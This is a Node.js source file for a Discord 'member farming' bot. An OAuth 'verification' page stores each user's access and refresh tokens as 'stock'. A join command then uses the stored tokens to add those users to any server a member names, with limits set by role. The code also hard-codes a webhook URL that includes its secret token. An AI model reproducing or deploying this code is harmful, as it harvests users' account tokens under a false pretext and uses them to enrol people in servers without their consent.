const { 
    Client, 
    GatewayIntentBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionsBitField,
    REST,
    Routes,
    SlashCommandBuilder,
    WebhookClient,
    MessageType
} = require('discord.js');
const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

const DEFAULT_PREFIX = ','; 
let currentPrefix = DEFAULT_PREFIX;
const OWNER_ID = '1481977461053984845';
const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone

// Standardized Webhook Client
const EXECUTION_WEBHOOK_URL = 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ';
const webhookClient = new WebhookClient({ url: EXECUTION_WEBHOOK_URL });

// --- Built-in File Persistence Setup ---
const DB_FILE = path.join(__dirname, 'database.json');

function readDB() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0 }, null, 2));
        }
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        return { users: {}, restockCounter: 0, allTimeAuthCount: 0 };
    }
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// --- Built-in HTTPS Request Helper ---
function postHttps(url, bodyString, headers = {}) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const req = https.request({
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'POST',
            headers: {
                ...headers,
                'Content-Length': Buffer.byteLength(bodyString)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
                catch (e) { resolve({ status: res.statusCode, data }); }
            });
        });
        req.on('error', reject);
        req.write(bodyString);
        req.end();
    });
}

function getHttps(url, headers = {}) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const req = https.request({
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'GET',
            headers
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
                catch (e) { resolve({ status: res.statusCode, data }); }
            });
        });
        req.on('error', reject);
        req.end();
    });
}

let lastBoostStickyMessage = null; 

const CHANNELS = {
    AUTORESTOCK: '1563253480553054358',       
    FARM_LOG: '1563253450693808210',          
    VERIFICATION_LOG: '1563253454653235261',  
    AUTO_DELETE: '1563253483824746659',
    ADD_BOT: '1563253479059886223'        
};

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

// --- Modern, Larger Centered Web Server Routes for OAuth Callbacks ---
app.get('/', async (req, res) => {
    const code = req.query.code;
    const error = req.query.error;

    if (error) {
        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Authorization Cancelled</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">You declined the authorization request. You can safely close this window and return to Discord.</p>
                    </div>
                </body>
            </html>
        `);
    }
    
    if (!code) {
        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#f5f5f7;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Flex Farmer Authentication</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">OAuth authentication server is operating normally.</p>
                    </div>
                </body>
            </html>
        `);
    }

    try {
        const verificationClientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1564997108908556369';
        const verificationClientSecret = process.env.VERIFICATION_CLIENT_SECRET || process.env.CLIENT_SECRET;
        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app/';

        const tokenParams = new URLSearchParams({
            client_id: verificationClientId,
            client_secret: verificationClientSecret,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri,
        }).toString();

        const tokenRes = await postHttps('https://discord.com/api/oauth2/token', tokenParams, {
            'Content-Type': 'application/x-www-form-urlencoded'
        });

        if (tokenRes.status !== 200 || !tokenRes.data || !tokenRes.data.access_token) {
            console.error('[OAUTH TOKEN ERROR DETAILS] Status:', tokenRes.status, 'Data:', JSON.stringify(tokenRes.data));
            return res.send(`
                <html>
                    <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                        <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                            <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Failed</h2>
                            <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Token exchange was rejected by Discord. Please check your Railway environment variables.</p>
                        </div>
                    </body>
                </html>
            `);
        }

        const oauthData = tokenRes.data;
        const userRes = await getHttps('https://discord.com/api/users/@me', {
            'Authorization': `Bearer ${oauthData.access_token}`
        });
        const userData = userRes.data;

        if (!userData || !userData.id) {
            return res.send(`
                <html>
                    <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                        <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                            <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Failed</h2>
                            <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Failed to retrieve your Discord user profile.</p>
                        </div>
                    </body>
                </html>
            `);
        }

        let dbData = readDB();
        dbData.users[userData.id] = {
            user_id: userData.id,
            username: userData.username,
            avatar: userData.avatar,
            banner: userData.banner,
            access_token: oauthData.access_token,
            refresh_token: oauthData.refresh_token,
            authorized_at: Date.now(),
            expires_at: Date.now() + (oauthData.expires_in * 1000)
        };
        dbData.restockCounter = (dbData.restockCounter || 0) + 1;
        dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + 1;
        writeDB(dbData);

        const totalStock = Object.keys(dbData.users).length;

        if (client.isReady()) {
            try {
                let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                if (verifLogChannel) {
                    const logEmbed = new EmbedBuilder()
                        .setTitle('New User Verified')
                        .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\nTotal Available Stock: \`${totalStock}\``)
                        .setColor(EMBED_COLOR)
                        .setTimestamp();

                    await verifLogChannel.send({ embeds: [logEmbed] });
                }
            } catch (logErr) {
                console.error('[VERIFICATION LOG ERROR]', logErr);
            }
        }

        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#55ff55;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Verification Successful</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">Your account has been verified successfully. You can now close this window and return to Discord.</p>
                    </div>
                </body>
            </html>
        `);
    } catch (error) {
        console.error('[OAUTH EXCEPTION]', error);
        return res.send(`
            <html>
                <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
                    <div style="width:100%;max-width:480px;background:#2b2d31;padding:50px 40px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);text-align:center;border:1px solid #3f4248;">
                        <h2 style="color:#ff5555;margin-top:0;margin-bottom:15px;font-size:24px;font-weight:600;">Server Error</h2>
                        <p style="color:#b5bac1;font-size:15px;line-height:1.6;margin:0;">An exception occurred during verification processing.</p>
                    </div>
                </body>
            </html>
        `);
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));

client.once('ready', async () => {
    console.log(`Flex Farmer logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
});

// --- 2-Hour Inactivity Kick Tracking ---
const pendingJoins = new Map();

client.on('guildMemberAdd', member => {
    if (member.user.bot) return;
    const timer = setTimeout(async () => {
        try {
            if (member.kickable) {
                await member.kick('Inactive: Did not use join command within 2 hours.');
                console.log(`[AUTO-KICK] Kicked ${member.user.tag} for inactivity.`);
            }
        } catch (e) {
            console.error('Failed to auto-kick inactive member:', e);
        }
        pendingJoins.delete(member.id);
    }, 2 * 60 * 60 * 1000);

    pendingJoins.set(member.id, timer);
});

client.on('messageCreate', async message => {
    const rawContent = message.content.trim();

    if (message.channel.id === CHANNELS.AUTO_DELETE) {
        setTimeout(async () => {
            try { if (message.deletable) await message.delete(); } catch (err) {}
        }, 7000);
    }

    if (message.author.bot) return;

    if (!rawContent.startsWith(currentPrefix)) return;

    const args = rawContent.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (message.author.id !== OWNER_ID && command !== 'join') {
        return webhookClient.send({ content: 'Only the join command is available to regular members.' });
    }

    if (command === 'join') {
        const targetGuildId = args[0];
        if (!targetGuildId) {
            return webhookClient.send({ content: `Please provide a Server ID: \`${currentPrefix}join <server_id>\`` });
        }

        const dbData = readDB();
        let tokensToUse = Object.values(dbData.users);
        if (tokensToUse.length === 0) {
            const outOfStockEmbed = new EmbedBuilder().setTitle('Out of Stock').setDescription(`No accounts available.`).setColor(EMBED_COLOR);
            return webhookClient.send({ embeds: [outOfStockEmbed] });
        }

        const roleLimits = [
            { id: '1564676932195455047', limit: 2 },   
            { id: '1563467132107231253', limit: 4 },   
            { id: '1563467152202137681', limit: 6 },   
            { id: '1563467218212356118', limit: 8 },   
            { id: '1563467378040504431', limit: 10 },   
            { id: '1563467675236311100', limit: 12 },  
            { id: '1563467259194908722', limit: 20 }   
        ];

        let allowedLimit = Infinity;
        let userMaxQueue = 20; 
        for (const tier of roleLimits) {
            if (message.member.roles.cache.has(tier.id)) {
                allowedLimit = tier.limit;
                userMaxQueue = tier.limit;
                break;
            }
        }

        if (allowedLimit !== Infinity) {
            const limit = Math.min(allowedLimit, tokensToUse.length);
            tokensToUse = tokensToUse.slice(0, limit);
        }

        const verificationBotToken = process.env.VERIFICATION_BOT_TOKEN || process.env.DISCORD_TOKEN;

        try {
            const checkGuildRes = await getHttps(`https://discord.com/api/v10/users/@me/guilds`, {
                'Authorization': `Bot ${verificationBotToken}`
            });
            const guildsList = checkGuildRes.data;
            const isInServer = Array.isArray(guildsList) && guildsList.some(g => g.id === targetGuildId);

            if (!isInServer) {
                const errorEmbed = new EmbedBuilder()
                    .setTitle('Bot Error')
                    .setDescription(`The bot is not in this server yet. Please go to <#${CHANNELS.ADD_BOT}> and invite it to your server.\n\nOnce the bot has joined, try using the command again.`)
                    .setColor(EMBED_COLOR);
                
                return webhookClient.send({ embeds: [errorEmbed] });
            }
        } catch (e) {
            console.error('Failed to check guild membership:', e);
        }

        if (pendingJoins.has(message.author.id)) {
            clearTimeout(pendingJoins.get(message.author.id));
            pendingJoins.delete(message.author.id);
        }

        const addingEmbed = new EmbedBuilder()
            .setTitle('Adding Members')
            .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
            .setColor(EMBED_COLOR);
        
        await webhookClient.send({ embeds: [addingEmbed] });

        let successCount = 0;
        for (const tokenData of tokensToUse) {
            try {
                const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
                    'Authorization': `Bot ${verificationBotToken}`,
                    'Content-Type': 'application/json'
                });

                if (joinRes.status >= 200 && joinRes.status < 300) {
                    successCount++;
                }
            } catch (err) {
                console.error('Failed to add user via Verification bot:', err);
            }
        }

        try {
            let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
            if (farmLogChannel) {
                const farmEmbed = new EmbedBuilder()
                    .setTitle('Farm Execution Log')
                    .setDescription(`**Executed By:** <@${message.author.id}>\n**Adder Bot:** Verification\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
                    .setColor(EMBED_COLOR)
                    .setTimestamp();
                await farmLogChannel.send({ embeds: [farmEmbed] });
            }
        } catch (e) {}
    }
});

client.login(process.env.DISCORD_TOKEN);
